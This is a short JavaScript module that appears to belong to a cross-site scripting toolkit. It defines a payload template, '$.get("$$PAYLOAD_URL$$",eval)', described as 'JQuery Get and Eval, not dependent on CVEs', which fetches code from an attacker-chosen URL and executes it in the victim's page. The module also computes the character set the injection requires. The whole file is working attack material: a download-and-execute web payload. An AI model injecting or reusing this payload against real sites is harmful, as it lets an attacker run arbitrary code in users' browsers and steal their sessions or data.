import renderable from '../lib/renderable.js'
import CharSet from '../lib/CharSet.js'

const script = '$.get("$$PAYLOAD_URL$$",eval)'

export default {
    description: `JQuery Get and Eval, not dependent on CVEs`,
    script: renderable(script),
    charset: new CharSet(renderable(script)({PAYLOAD_URL:''}))
}

